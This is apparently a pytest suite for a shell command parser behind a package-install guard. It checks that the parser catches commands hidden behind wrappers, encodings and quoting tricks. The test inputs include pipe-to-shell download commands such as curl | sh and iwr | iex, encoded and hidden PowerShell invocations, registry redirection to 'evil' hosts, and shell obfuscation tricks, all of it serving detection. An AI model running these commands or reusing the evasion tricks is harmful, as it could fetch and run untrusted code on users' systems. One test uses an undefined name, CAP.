"""engine/parse.py: splitting, unwrapping and tokenizing bash, PowerShell and cmd command lines.

Every later stage reads this parser's output, so a command it misses is an install the guard
misses. Each test names the shell syntax it pins.
"""

from __future__ import annotations

import base64
import os
import shlex
import sys
import time

import pytest

from engine.parse import BUDGET_EXCEEDED, DEPTH_LIMIT, MALFORMED, MAX_DEPTH, Cmd, split_commands


def argvs(line: str, shell: str = "bash") -> list[list[str]]:
    return [c.argv for c in split_commands(line, shell)]


def find(line: str, argv: list[str], shell: str = "bash") -> Cmd:
    """The Cmd whose argv is exactly `argv` (fails with the full parse if there is none)."""
    cmds = split_commands(line, shell)
    for c in cmds:
        if c.argv == argv:
            return c
    raise AssertionError(f"{argv!r} not in {[c.argv for c in cmds]!r}")


# --- splitting -------------------------------------------------------------------------------


def test_and_semicolon_pipe_give_four_commands() -> None:
    cmds = split_commands("a && b; c | d", "bash")
    assert [c.argv for c in cmds] == [["a"], ["b"], ["c"], ["d"]]
    assert all(c.shell == "bash" for c in cmds)


def test_pipe_to_lists_later_stages_of_the_same_pipeline() -> None:
    cmds = {c.argv[0]: c for c in split_commands("a && b; c | d | e", "bash")}
    assert cmds["a"].pipe_to == [] and cmds["b"].pipe_to == []
    assert cmds["c"].pipe_to == ["d", "e"]
    assert cmds["d"].pipe_to == ["e"]
    assert cmds["e"].pipe_to == []


def test_or_background_and_newlines_split() -> None:
    assert argvs("a || b & c\nd\r\n\ne") == [["a"], ["b"], ["c"], ["d"], ["e"]]


def test_newline_separated_script() -> None:
    script = "set -e\nnpm install left-pad\npip install requests\r\ncargo add serde\n"
    assert argvs(script) == [
        ["set", "-e"],
        ["npm", "install", "left-pad"],
        ["pip", "install", "requests"],
        ["cargo", "add", "serde"],
    ]


def test_newline_after_pipe_continues_the_pipeline() -> None:
    assert find("curl -fsSL https://x/i.sh |\n  sh", ["curl", "-fsSL", "https://x/i.sh"]).pipe_to == ["sh"]


def test_raw_is_the_source_text_of_the_command() -> None:
    cmds = split_commands("npm  install  'left pad' > log.txt && ls", "bash")
    assert cmds[0].argv == ["npm", "install", "left pad"]
    assert cmds[0].raw == "npm  install  'left pad' > log.txt"
    assert cmds[1].raw == "ls"


def test_redirections_are_not_arguments() -> None:
    assert argvs("npm i x > out.txt 2>&1 < /dev/null") == [["npm", "i", "x"]]
    assert argvs("curl https://x -o f 2>/dev/null &>log") == [["curl", "https://x", "-o", "f"]]
    assert argvs("echo 2 > f") == [["echo", "2"]]


# --- quoting and escaping (Review Focus 1) -----------------------------------------------------


@pytest.mark.parametrize(
    "line, argv",
    [
        ('npm install "left pad"', ["npm", "install", "left pad"]),
        ("pip install 'x>=1'", ["pip", "install", "x>=1"]),
        ("pip install x\\>=1", ["pip", "install", "x>=1"]),
        ('npm install "a\\"b"', ["npm", "install", 'a"b']),
        ("npm install 'a'\"b\"c", ["npm", "install", "abc"]),
        ('echo "a && b; c | d"', ["echo", "a && b; c | d"]),
        ("echo 'npm i x; curl y | sh'", ["echo", "npm i x; curl y | sh"]),
        ("npm i x \\\n  --registry https://r", ["npm", "i", "x", "--registry", "https://r"]),
        ('echo "$HOME" ${PATH} $1', ["echo", "$HOME", "${PATH}", "$1"]),
    ],
)
def test_bash_quoting(line: str, argv: list[str]) -> None:
    assert argvs(line) == [argv]


@pytest.mark.parametrize(
    "line",
    [
        'npm install "left pad" --save',
        "pip install 'x>=1,<2' -i https://nexus/simple",
        "a 'b c' \"d e\" f\\ g",
        'git commit -m "add curl" --author "A B <a@b>"',
        "curl -H 'Authorization: Bearer x' https://h/p?q=1",
    ],
)
def test_bash_tokens_match_shlex(line: str) -> None:
    assert argvs(line) == [shlex.split(line)]


def test_ansi_c_quoting_is_decoded() -> None:
    assert argvs("$'\\x6e\\x70\\x6d' i x") == [["npm", "i", "x"]]
    assert argvs("echo $'a\\tb\\'c'") == [["echo", "a\tb'c"]]


@pytest.mark.parametrize(
    "line, argv",
    [
        ('npm install "left`"pad"', ["npm", "install", 'left"pad']),
        ("npm install left` pad", ["npm", "install", "left pad"]),
        ('Write-Output "a`tb"', ["Write-Output", "a\tb"]),
        ("npm install 'it''s'", ["npm", "install", "it's"]),
        ('npm install "say ""hi"""', ["npm", "install", 'say "hi"']),
        ("npm install 'C:\\tmp\\x'", ["npm", "install", "C:\\tmp\\x"]),
        ("npm install \u201cleft pad\u201d", ["npm", "install", "left pad"]),
        ("npm i x `\n  --registry https://r", ["npm", "i", "x", "--registry", "https://r"]),
        ("i`wr https://x", ["iwr", "https://x"]),
    ],
)
def test_powershell_quoting_and_backticks(line: str, argv: list[str]) -> None:
    assert argvs(line, "powershell") == [argv]


def test_powershell_separators() -> None:
    assert argvs("a; b | c && d || e\nf", "powershell") == [["a"], ["b"], ["c"], ["d"], ["e"], ["f"]]
    assert argvs('echo "a; b | c"', "powershell") == [["echo", "a; b | c"]]


def test_powershell_commas_separate_array_items() -> None:
    assert argvs("Install-Module A,B -Force", "powershell") == [["Install-Module", "A", "B", "-Force"]]


@pytest.mark.parametrize(
    "line, argvs_",
    [
        ("npm install left^&pad", [["npm", "install", "left&pad"]]),
        ("echo a ^| npm i x", [["echo", "a", "|", "npm", "i", "x"]]),
        ('npm install "a&b" & dir', [["npm", "install", "a&b"], ["dir"]]),
        ("npm i x ^\n  --registry https://r", [["npm", "i", "x", "--registry", "https://r"]]),
        ("a & b && c || d | e", [["a"], ["b"], ["c"], ["d"], ["e"]]),
        ("echo a;b", [["echo", "a;b"]]),
        ("@npm i x >nul 2>&1", [["npm", "i", "x"]]),
    ],
)
def test_cmd_quoting_and_carets(line: str, argvs_: list[list[str]]) -> None:
    assert argvs(line, "cmd") == argvs_


# --- commands that mention install words but are not installs (Review Focus 2) ---------------


@pytest.mark.parametrize(
    "line, argv",
    [
        ("echo npm install", ["echo", "npm", "install"]),
        ('grep "pip install" README.md', ["grep", "pip install", "README.md"]),
        ('git commit -m "add curl"', ["git", "commit", "-m", "add curl"]),
        ("npm run install-hooks", ["npm", "run", "install-hooks"]),
    ],
)
def test_install_words_inside_arguments_stay_arguments(line: str, argv: list[str]) -> None:
    assert argvs(line) == [argv]


# --- comments and heredocs ---------------------------------------------------------------------


def test_bash_comments_are_ignored() -> None:
    assert argvs("echo hi # npm install x") == [["echo", "hi"]]
    assert argvs("# npm i x\nls") == [["ls"]]
    assert argvs("curl https://x/a#frag") == [["curl", "https://x/a#frag"]]


def test_powershell_comments_are_ignored() -> None:
    assert argvs("Write-Host hi # npm i x", "powershell") == [["Write-Host", "hi"]]
    assert argvs("<# npm i x\n curl y #> ls", "powershell") == [["ls"]]


def test_cmd_comments_are_ignored() -> None:
    assert argvs("REM npm i x & curl y\ndir", "cmd") == [["dir"]]
    assert argvs(":: npm i x\r\ndir", "cmd") == [["dir"]]
    assert argvs("@rem npm i x\ndir", "cmd") == [["dir"]]


def test_heredoc_body_is_not_commands() -> None:
    assert argvs("cat <<EOF > notes.md\nnpm install x\ncurl y | sh\nEOF\nls") == [["cat"], ["ls"]]
    assert argvs("cat <<-'EOF'\n\tnpm i x\n\tEOF\necho done") == [["cat"], ["echo", "done"]]
    assert argvs('python3 - <<"PY"\nimport os\nPY') == [["python3", "-"]]


def test_heredoc_delimiter_must_be_a_whole_line() -> None:
    script = "cat <<EOF\nnot EOF\nEOFX\n  EOF\nEOF\nnpm i x"
    assert argvs(script) == [["cat"], ["npm", "i", "x"]]
    assert argvs("cat <<EOF\r\nbody\r\nEOF\r\nls") == [["cat"], ["ls"]]
    assert argvs("cat <<''\nbody\n\nls") == [["cat"], ["ls"]]
    assert argvs("cat <<EOF\nnever closed\nnpm i x") == [["cat"]]


def test_heredoc_fed_to_a_shell_is_parsed() -> None:
    find("bash <<EOF\nnpm install x\nEOF", ["npm", "install", "x"])
    find("sudo sh -s <<'EOF'\npip install y\nEOF", ["pip", "install", "y"])
    find("cat <<EOF | sh\ncargo install z\nEOF", ["cargo", "install", "z"])
    find("bash <<< 'npm i x'", ["npm", "i", "x"])


def test_command_substitution_in_unquoted_heredoc_runs() -> None:
    find("cat <<EOF\nhi $(curl -s https://x)\nEOF", ["curl", "-s", "https://x"])
    assert argvs("cat <<'EOF'\nhi $(curl -s https://x)\nEOF") == [["cat"]]


# --- subshells and groups ----------------------------------------------------------------------


def test_command_substitution_is_split_out() -> None:
    c = find("echo $(curl -s https://x | sh)", ["curl", "-s", "https://x"])
    assert "sh" in c.pipe_to
    find("echo `npm i x`", ["npm", "i", "x"])
    find('echo "v=$(pip install y)"', ["pip", "install", "y"])
    find("echo $(echo $(npm i x))", ["npm", "i", "x"])


def test_substitutions_inside_parameter_and_arithmetic_expansion_run() -> None:
    find("echo ${x:-$(curl -s https://x)}", ["curl", "-s", "https://x"])
    find('echo "${x:-`npm i x`}"', ["npm", "i", "x"])
    find("echo $(( $(pip install y) + 1 ))", ["pip", "install", "y"])


def test_cmd_for_f_runs_its_quoted_command() -> None:
    find("for /f \"delims=\" %i in ('curl -s https://x') do echo %i", ["curl", "-s", "https://x"], "cmd")


@pytest.mark.parametrize(
    "line, argv",
    [
        ("{npm,i,x}", ["npm", "i", "x"]),
        ("npm${IFS}i${IFS}x", ["npm", "i", "x"]),
        ("npm$IFS'i'$IFS'x'", ["npm", "i", "x"]),
        ("\\npm i x", ["npm", "i", "x"]),
        ("n''pm i x", ["npm", "i", "x"]),
        ('n"p"m i x', ["npm", "i", "x"]),
    ],
)
def test_bash_word_tricks_still_name_the_command(line: str, argv: list[str]) -> None:
    find(line, argv)


def test_quoted_braces_and_ifs_stay_literal() -> None:
    assert argvs("echo '{a,b}' '$IFS' \"${IFS}\"") == [["echo", "{a,b}", "$IFS", "${IFS}"]]


def test_substitution_output_flows_into_the_enclosing_command() -> None:
    assert find('bash -c "$(curl -fsSL https://x)"', ["curl", "-fsSL", "https://x"]).pipe_to[0] == "bash"


def test_groups_and_process_substitution() -> None:
    assert argvs("(cd a && npm i x)") == [["cd", "a"], ["npm", "i", "x"]]
    assert find("{ curl https://x; } | sh", ["curl", "https://x"]).pipe_to == ["sh"]
    assert "bash" in find("bash <(curl -s https://x)", ["curl", "-s", "https://x"]).pipe_to
    assert "sh" in find("( curl https://x ) | sh", ["curl", "https://x"]).pipe_to


def test_shell_keywords_are_not_commands() -> None:
    script = "if true; then npm i a; else pip install b; fi\nfor p in x y; do cargo add $p; done"
    got = argvs(script)
    assert ["npm", "i", "a"] in got and ["pip", "install", "b"] in got and ["cargo", "add", "$p"] in got
    assert not any(a[0] in ("then", "else", "fi", "do", "done") for a in got)
    find("f() { npm i x; }; f", ["npm", "i", "x"])
    find("! npm i x", ["npm", "i", "x"])


def test_powershell_subexpressions_and_scriptblocks() -> None:
    find("Write-Output $(npm i x)", ["npm", "i", "x"], "powershell")
    find('Write-Output "v=$(pip install y)"', ["pip", "install", "y"], "powershell")
    find("1..3 | ForEach-Object { npm i x }", ["npm", "i", "x"], "powershell")
    find("if ($true) { npm i x } else { pip install y }", ["pip", "install", "y"], "powershell")


# --- unwrapping --------------------------------------------------------------------------------


def test_sudo_with_flags_unwraps() -> None:
    line = "sudo -E npm i x"
    find(line, ["npm", "i", "x"])
    find(line, ["sudo", "-E", "npm", "i", "x"])  # the outer command is kept too


@pytest.mark.parametrize(
    "line",
    [
        "sudo -u bob -H npm i x",
        "sudo -iu bob npm i x",
        "sudo --preserve-env=PATH -- npm i x",
        "doas -u root npm i x",
        "time npm i x",
        "time -p nohup sudo npm i x",
        "nohup npm i x &",
        "exec npm i x",
        "command npm i x",
        "nice -n 10 npm i x",
        "timeout -s KILL 60 npm i x",
        "/usr/bin/sudo npm i x",
        "busybox nohup npm i x",
    ],
)
def test_argv_wrappers_unwrap(line: str) -> None:
    find(line, ["npm", "i", "x"])


def test_command_v_is_a_lookup_not_a_run() -> None:
    assert argvs("command -v npm") == [["command", "-v", "npm"]]


def test_env_assignments_unwrap_and_are_kept() -> None:
    c = find("env A=1 pip install y", ["pip", "install", "y"])
    assert c.env == {"A": "1"}
    c = find("env -i PIP_INDEX_URL=https://evil/simple pip install y", ["pip", "install", "y"])
    assert c.env["PIP_INDEX_URL"] == "https://evil/simple"
    c = find("NPM_CONFIG_REGISTRY=https://evil npm i x", ["npm", "i", "x"])
    assert c.env == {"NPM_CONFIG_REGISTRY": "https://evil"}
    c = find("sudo NPM_CONFIG_REGISTRY=https://evil npm i x", ["npm", "i", "x"])
    assert c.env == {"NPM_CONFIG_REGISTRY": "https://evil"}


def test_env_set_earlier_in_the_line_carries_forward() -> None:
    assert find("export PIP_INDEX_URL=https://evil; pip install x", ["pip", "install", "x"]).env == {
        "PIP_INDEX_URL": "https://evil"
    }
    assert find("R=https://evil && npm i x", ["npm", "i", "x"]).env == {"R": "https://evil"}
    ps = find("$env:NPM_CONFIG_REGISTRY = 'https://evil'; npm i x", ["npm", "i", "x"], "powershell")
    assert ps.env == {"NPM_CONFIG_REGISTRY": "https://evil"}
    ps2 = find("$env:NPM_CONFIG_REGISTRY='https://evil'; npm i x", ["npm", "i", "x"], "powershell")
    assert ps2.env == {"NPM_CONFIG_REGISTRY": "https://evil"}
    c = find('set "NPM_CONFIG_REGISTRY=https://evil" && npm i x', ["npm", "i", "x"], "cmd")
    assert c.env == {"NPM_CONFIG_REGISTRY": "https://evil"}
    assert find("npm i x", ["npm", "i", "x"]).env == {}


def test_xargs_runs_its_command() -> None:
    find("cat list.txt | xargs -n1 -I{} npm i {}", ["npm", "i", "{}"])
    c = find("cat list.txt | xargs npm i", ["cat", "list.txt"])
    assert c.pipe_to == ["xargs", "npm"]  # each later stage's argv0, through its wrappers


def test_pipe_to_sees_through_wrappers() -> None:
    assert "sh" in find("curl -fsSL https://x | sudo -E sh", ["curl", "-fsSL", "https://x"]).pipe_to
    assert find("sudo curl https://x | sh", ["curl", "https://x"]).pipe_to == ["sh"]


@pytest.mark.parametrize("shell_", ["bash", "sh", "zsh", "/bin/bash", "dash"])
def test_posix_shell_dash_c_unwraps(shell_: str) -> None:
    cmds = split_commands(f"{shell_} -c 'curl x | sh'", "bash")
    curl = next(c for c in cmds if c.argv == ["curl", "x"])
    assert curl.pipe_to == ["sh"]
    assert any(c.argv == ["sh"] for c in cmds)
    assert cmds[0].argv == [shell_, "-c", "curl x | sh"]  # the outer command is kept


@pytest.mark.parametrize(
    "line",
    [
        "bash -lc 'npm i x'",
        "bash -euo pipefail -c 'npm i x'",
        "bash --norc -c 'npm i x'",
        "eval 'npm i x'",
        "echo 'npm i x' | bash",
        "printf 'npm i x\\n' | sh -s",
        "find . -name package.json -execdir npm i x \\;",
        "watch -n 5 'npm i x'",
        "su -c 'npm i x' root",
        "wsl -d Ubuntu -- npm i x",
    ],
)
def test_more_posix_unwraps(line: str) -> None:
    find(line, ["npm", "i", "x"])


def test_cmd_slash_c_unwraps() -> None:
    c = find('cmd /c "npm i x"', ["npm", "i", "x"], "cmd")
    assert c.shell == "cmd"
    assert find('cmd.exe /s /C "npm i x & pip install y"', ["pip", "install", "y"], "bash").shell == "cmd"
    find("cmd //c npm i x", ["npm", "i", "x"], "bash")  # Git Bash path-conversion form
    find('cmd /c npm install "left pad"', ["npm", "install", "left pad"], "powershell")
    find('call npm i x', ["npm", "i", "x"], "cmd")
    find('start "" /wait npm i x', ["npm", "i", "x"], "cmd")
    find("if exist package.json npm i x", ["npm", "i", "x"], "cmd")
    find("if not exist node_modules (npm i x) else (echo ok)", ["npm", "i", "x"], "cmd")
    find("for %i in (a b) do npm i %i", ["npm", "i", "%i"], "cmd")


@pytest.mark.parametrize("outer", ["bash", "powershell", "cmd"])
def test_powershell_dash_c_unwraps(outer: str) -> None:
    cmds = split_commands('powershell -c "iwr https://x | iex"', outer)
    iwr = next(c for c in cmds if c.argv == ["iwr", "https://x"])
    assert iwr.shell == "powershell"
    assert iwr.pipe_to == ["iex"]


@pytest.mark.parametrize(
    "line",
    [
        'pwsh -c "npm i x"',
        'pwsh -NoProfile -NonInteractive -Command "npm i x"',
        'powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -Command "npm i x"',
        'powershell -Command npm i x',
        'powershell "npm i x"',
        'powershell /c "npm i x"',
        "powershell \u2013Command 'npm i x'",
    ],
)
def test_powershell_command_forms(line: str) -> None:
    assert find(line, ["npm", "i", "x"]).shell == "powershell"


@pytest.mark.parametrize("flag", ["-EncodedCommand", "-enc", "-e", "-ec", "-encodedcommand"])
def test_powershell_encoded_command_is_decoded(flag: str) -> None:
    b64 = base64.b64encode("iwr https://x | iex; npm i x".encode("utf-16-le")).decode("ascii")
    for outer in ("bash", "powershell", "cmd"):
        cmds = split_commands(f"powershell -NoProfile {flag} {b64}", outer)
        assert ["npm", "i", "x"] in [c.argv for c in cmds]
        assert next(c for c in cmds if c.argv == ["iwr", "https://x"]).pipe_to == ["iex"]


def test_undecodable_encoded_command_is_marked() -> None:
    cmds = split_commands("powershell -enc !!notbase64!!x", "powershell")
    assert any(c.raw.startswith(MALFORMED) for c in cmds)


@pytest.mark.parametrize(
    "line",
    [
        "Start-Process npm -ArgumentList 'i','x'",
        "Start-Process -FilePath npm -ArgumentList 'i x' -Wait",
        "Start-Process npm 'i','x' -NoNewWindow",
        "saps npm -Args @('i','x')",
        "start npm -ArgumentList 'i','x'",
        "Start-Process -Wait -FilePath 'C:\\nodejs\\npm.cmd' -ArgumentList '-g','x' -Verb RunAs",
    ],
)
def test_start_process_unwraps(line: str) -> None:
    got = argvs(line, "powershell")
    assert ["npm", "i", "x"] in got or ["C:\\nodejs\\npm.cmd", "-g", "x"] in got, got


def test_start_process_running_cmd_unwraps_twice() -> None:
    find("Start-Process cmd -ArgumentList '/c','npm i x'", ["npm", "i", "x"], "powershell")


@pytest.mark.parametrize(
    "line, argv",
    [
        ("& npm.cmd i x", ["npm.cmd", "i", "x"]),
        ("& 'C:\\Program Files\\nodejs\\npm.cmd' install x", ["C:\\Program Files\\nodejs\\npm.cmd", "install", "x"]),
        ("& { npm i x }", ["npm", "i", "x"]),
        (". npm i x", ["npm", "i", "x"]),
        ("iex 'npm i x'", ["npm", "i", "x"]),
        ("Invoke-Expression -Command \"npm i x\"", ["npm", "i", "x"]),
        ("'npm i x' | iex", ["npm", "i", "x"]),
        ("@'\nnpm i x\n'@ | iex", ["npm", "i", "x"]),
        ('@"\nWrite-Output $(npm i x)\n"@', ["npm", "i", "x"]),
        ("$out = npm i x", ["npm", "i", "x"]),
        ("cmd /c --% npm i \"x\"", ["npm", "i", "x"]),
    ],
)
def test_powershell_call_operator_and_invoke_expression(line: str, argv: list[str]) -> None:
    find(line, argv, "powershell")


def test_iex_of_a_download_is_a_pipe_into_iex() -> None:
    assert "iex" in find("iex (iwr https://x)", ["iwr", "https://x"], "powershell").pipe_to
    c = find("(New-Object Net.WebClient).DownloadString('https://x') | iex", ["New-Object", "Net.WebClient"], "powershell")
    assert "iex" in c.pipe_to


def test_nested_wrappers_unwrap_recursively() -> None:
    line = "sudo -E bash -c \"cmd /c 'powershell -c npm i x'\""
    c = find(line, ["npm", "i", "x"])
    assert c.shell == "powershell"


def test_depth_limit_stops_and_marks() -> None:
    line = "npm i x"
    for _ in range(MAX_DEPTH + 2):
        line = "bash -c " + shlex.quote(line)
    cmds = split_commands(line, "bash")
    assert ["npm", "i", "x"] not in [c.argv for c in cmds]
    assert any(c.raw.startswith(DEPTH_LIMIT) for c in cmds)
    ok = "npm i x"
    for _ in range(MAX_DEPTH):
        ok = "bash -c " + shlex.quote(ok)
    find(ok, ["npm", "i", "x"])


# --- malformed input never raises -------------------------------------------------------------

NASTY = [
    "npm i 'x",
    'npm i "x',
    "echo $(npm i x",
    "echo `npm i x",
    "( npm i x",
    "{ npm i x",
    "echo ${x",
    "echo $((1+",
    "cat <<EOF\nnpm i x",
    "\\",
    "'",
    "&&||;;|&",
    "))))((((",
    "\x00\x01\x02 npm i x",
    "$'\\x",
    "bash -c",
    "powershell -enc",
    "Start-Process",
    "a" * 10000 + " '" + "b" * 10000,
    "$(" * 3000 + "npm i x",
]


@pytest.mark.parametrize("line", NASTY, ids=range(len(NASTY)))
@pytest.mark.parametrize("shell_", ["bash", "powershell", "cmd"])
def test_nasty_input_never_raises(line: str, shell_: str) -> None:
    cmds = split_commands(line, shell_)
    assert isinstance(cmds, list)
    assert all(isinstance(c, Cmd) and isinstance(c.argv, list) for c in cmds)


def test_unterminated_quote_falls_back_to_whitespace_split_and_marks_raw() -> None:
    cmds = split_commands("npm i 'x && curl https://y | sh", "bash")
    assert any(c.argv[:2] == ["npm", "i"] for c in cmds)
    curl = next(c for c in cmds if c.argv[0] == "curl")
    assert curl.raw.startswith(MALFORMED)
    assert curl.pipe_to == ["sh"]
    assert any(c.argv[:2] == ["npm", "i"] for c in split_commands('npm i "x', "powershell"))
    assert any(c.argv[:2] == ["npm", "i"] for c in split_commands('npm i "x & dir', "cmd"))


def test_an_internal_error_still_returns_marked_commands(monkeypatch: pytest.MonkeyPatch) -> None:
    import engine.parse as parse

    def boom(*args: object) -> None:
        raise RuntimeError("bug")

    monkeypatch.setattr(parse, "_emit", boom)
    cmds = split_commands("npm i 'x' && curl https://y | sh", "bash")
    assert [c.argv for c in cmds] == [["npm", "i", "x"], ["curl", "https://y"], ["sh"]]
    assert all(c.raw.startswith(MALFORMED) for c in cmds)
    assert cmds[1].pipe_to == ["sh"]


def test_env_flood_marks_later_commands() -> None:
    line = "".join(f"export V{i}=x; " for i in range(100)) + "npm i x"
    npm = find(line, ["npm", "i", "x"])
    assert npm.raw.startswith(MALFORMED)
    assert not find("export A=1; npm i x", ["npm", "i", "x"]).raw.startswith(MALFORMED)


def test_garbage_collector_state_is_restored(monkeypatch: pytest.MonkeyPatch) -> None:
    import gc

    import engine.parse as parse

    assert gc.isenabled()
    split_commands("npm i x", "bash")
    assert gc.isenabled()
    gc.disable()
    try:
        split_commands("npm i x", "bash")
        assert not gc.isenabled()
    finally:
        gc.enable()
    monkeypatch.setattr(parse, "_dedup", lambda cmds: 1 / 0)
    with pytest.raises(ZeroDivisionError):
        split_commands("npm i x", "bash")
    assert gc.isenabled()


def test_shell_names_and_odd_input() -> None:
    assert split_commands("npm i x", "pwsh")[0].shell == "powershell"
    assert split_commands("npm i x", "zsh")[0].shell == "bash"
    assert split_commands("npm i x", "cmd.exe")[0].shell == "cmd"
    assert split_commands("", "bash") == []
    assert split_commands("   \n  ", "powershell") == []
    assert split_commands("\ufeffnpm i x", "bash")[0].argv == ["npm", "i", "x"]
    assert split_commands("echo h\u00e9llo \u2192 \u4e16\u754c", "bash")[0].argv == ["echo", "h\u00e9llo", "\u2192", "\u4e16\u754c"]


# --- fix round 1: env-aware dedup, cwd, PowerShell call parens, cmd start, more wrappers -------


def test_dedup_keeps_commands_that_differ_by_env() -> None:
    line = (
        "export NPM_CONFIG_REGISTRY=https://nexus.corp/r; npm i x; "
        "export NPM_CONFIG_REGISTRY=https://evil.com; npm i x"
    )
    npms = [c for c in split_commands(line, "bash") if c.argv == ["npm", "i", "x"]]
    regs = {c.env.get("NPM_CONFIG_REGISTRY") for c in npms}
    assert regs == {"https://nexus.corp/r", "https://evil.com"}


def test_identical_commands_with_identical_env_still_merge() -> None:
    cmds = [c for c in split_commands("npm i x | npm i x", "bash") if c.argv == ["npm", "i", "x"]]
    assert len(cmds) == 1


def test_cwd_tracks_cd_within_one_input() -> None:
    cmds = [c for c in split_commands("pip install x; cd /tmp/evil; pip install x", "bash") if c.argv[:2] == ["pip", "install"]]
    assert len(cmds) == 2
    assert cmds[0].cwd is None
    assert cmds[1].cwd == "/tmp/evil"


def test_cwd_tracks_pushd_and_powershell_and_cmd() -> None:
    assert find("pushd /opt && npm i x", ["npm", "i", "x"]).cwd == "/opt"
    for cd in ("cd", "sl", "Set-Location", "chdir"):
        c = find(f"{cd} C:\\evil; npm i x", ["npm", "i", "x"], "powershell")
        assert c.cwd == "C:\\evil", cd
    assert find("cd /d D:\\evil && npm i x", ["npm", "i", "x"], "cmd").cwd == "D:\\evil"


def test_powershell_call_parens_split_the_command_name() -> None:
    c = find("iex(iwr https://x)", ["iwr", "https://x"], "powershell")
    assert "iex" in c.pipe_to
    c = find("IEX(New-Object Net.WebClient).DownloadString('http://x')", ["New-Object", "Net.WebClient"], "powershell")
    assert any(p.lower() == "iex" for p in c.pipe_to)
    find("npm('install') x", ["npm", "install", "x"], "powershell")
    find("npm.cmd('i') x", ["npm.cmd", "i", "x"], "powershell")
    find("npm (\"install\") x", ["npm", "install", "x"], "powershell")
    # other expressions stay literal
    find("npm (Get-Pkg) x", ["npm", "(Get-Pkg)", "x"], "powershell")


@pytest.mark.parametrize(
    "line",
    [
        'start "foo" npm install evil',
        'start /min "x" npm i x',
        'cmd /c start "t" npm i x',
        'start "" /wait npm i x',
    ],
)
def test_cmd_start_quoted_title_is_not_the_program(line: str) -> None:
    got = argvs(line, "cmd")
    assert ["npm", "install", "evil"] in got or ["npm", "i", "x"] in got, got
    assert not any(a and a[0] in ("foo", "x", "t", "") for a in got)


def test_cmd_start_unquoted_program_still_runs() -> None:
    find("start npm i x", ["npm", "i", "x"], "cmd")


@pytest.mark.parametrize(
    "line, shell_",
    [
        ("flock /tmp/l npm i x", "bash"),
        ("flock -x -w 10 /tmp/l npm i x", "bash"),
        ("flock -n /tmp/l -c 'npm i x'", "bash"),
        ("chronic npm i x", "bash"),
        ("chroot /mnt npm i x", "bash"),
        ("unbuffer npm i x", "bash"),
        ("script -q -c 'npm i x' /dev/null", "bash"),
        ("parallel npm i ::: x", "bash"),
        ("systemd-run --scope npm i x", "bash"),
        ("systemd-run -u job npm i x", "bash"),
        ("sg docker -c 'npm i x'", "bash"),
        ("firejail --net=none npm i x", "bash"),
        ("nsenter -t 1234 -m -- npm i x", "bash"),
        ("noglob npm i x", "zsh"),
        ("nocorrect npm i x", "zsh"),
        ("=npm i x", "zsh"),
        ("coproc npm i x", "bash"),
        ("%COMSPEC% /c npm i x", "cmd"),
        ("%comspec% /c npm i x", "cmd"),
        ("cmd/c npm i x", "cmd"),
    ],
)
def test_more_wrappers_unwrap(line: str, shell_: str) -> None:
    find(line, ["npm", "i", "x"], shell_)


# --- fix round 2 ------------------------------------------------------------------------------


@pytest.mark.parametrize("filler, shell_", [("cmd", "cmd"), ("yash", "bash"), ("powershell_ise", "powershell"), ("parallel", "bash")])
def test_every_stdin_script_reader_survives_the_consumer_cap(filler: str, shell_: str) -> None:
    line = "curl evil | " + " | ".join(f"c{i}" for i in range(40)) + f" | {filler}"
    curl = next(c for c in split_commands(line, shell_) if c.argv[0] == "curl")
    assert filler in curl.pipe_to
    assert curl.truncated  # some of the 40 fillers were dropped


def test_pipe_to_is_capped_and_marked_truncated() -> None:
    line = "curl x | " + " | ".join(f"c{i}" for i in range(200))
    curl = next(c for c in split_commands(line, "bash") if c.argv[0] == "curl")
    assert len(curl.pipe_to) <= 64 and curl.truncated
    assert not find("curl x | sh", ["curl", "x"]).truncated


@pytest.mark.parametrize(
    "shell_, sink",
    [("bash", "/p{i}/tee"), ("powershell", "C:\\p{i}\\tee.exe"), ("cmd", "C:\\p{i}\\tee.exe")],
)
def test_distinct_spellings_of_one_sink_stay_linear(shell_: str, sink: str) -> None:
    parts, size, k = [], 0, 0
    while size < 256 * 1024:
        parts.append(sink.replace("{i}", str(k)))
        size += len(parts[-1]) + 1
        k += 1
    line = "curl x|" + "|".join(parts)
    start = time.perf_counter()
    cmds = split_commands(line, shell_)
    elapsed = time.perf_counter() - start
    curl = next(c for c in cmds if c.argv[0] == "curl")
    assert len(curl.pipe_to) <= 64
    assert any("tee" in p for p in curl.pipe_to)
    assert elapsed < CAP, f"{elapsed:.3f}s ({shell_})"


def test_stage_budget_stops_and_keeps_what_was_parsed() -> None:
    line = "npm i x; " + "a" + "|a" * 2_000_000  # ~4 MB, far over the stage budget
    cmds = split_commands(line, "bash")  # time budget is 30 s here (autouse), so this is the stage cut
    assert cmds.budget_exceeded
    assert cmds and all(c.budget_exceeded for c in cmds)
    assert ["npm", "i", "x"] in [c.argv for c in cmds]  # what was parsed before the cut is kept


def test_word_budget_stops_on_one_huge_stage() -> None:
    line = "npm i x; echo " + "y " * 2_000_000  # one stage, millions of words
    cmds = split_commands(line, "bash")
    assert cmds.budget_exceeded
    assert ["npm", "i", "x"] in [c.argv for c in cmds]


def test_time_budget_stops_quickly_and_flags(monkeypatch: pytest.MonkeyPatch) -> None:
    import engine.parse as parse

    monkeypatch.setattr(parse, "_MAX_SECONDS", 0.05)
    line = "a" + "|a" * 2_000_000
    start = time.perf_counter()
    cmds = split_commands(line, "bash")
    elapsed = time.perf_counter() - start
    assert cmds.budget_exceeded
    assert elapsed < parse._MAX_SECONDS + 1.0, f"{elapsed:.3f}s"


def test_budget_marker_when_nothing_was_emitted(monkeypatch: pytest.MonkeyPatch) -> None:
    import engine.parse as parse

    monkeypatch.setattr(parse, "_MAX_TICKS", 0)  # over the stage budget immediately
    cmds = split_commands("npm i x && curl y | sh", "bash")
    assert cmds.budget_exceeded and cmds
    assert cmds[-1].raw.startswith(BUDGET_EXCEEDED)  # a marker is always appended when cut
    monkeypatch.undo()
    assert not split_commands("npm i x", "bash").budget_exceeded


@pytest.mark.parametrize("line", ['start npm"" i evil', 'start np"m" i evil'])
def test_cmd_start_program_with_inner_quotes_is_the_program(line: str) -> None:
    find(line, ["npm", "i", "evil"], "cmd")


@pytest.mark.parametrize(
    "line",
    ["flock /l pip install -c c.txt evilpkg", "flock -w 5 /l pip install -c c.txt evil"],
)
def test_flock_c_only_counts_as_flocks_own_option(line: str) -> None:
    got = argvs(line)
    assert any(a[:2] == ["pip", "install"] and "-c" in a for a in got), got
    assert ["c.txt"] not in got


def test_flock_own_c_still_runs_a_command() -> None:
    find("flock /l -c 'npm i x'", ["npm", "i", "x"])
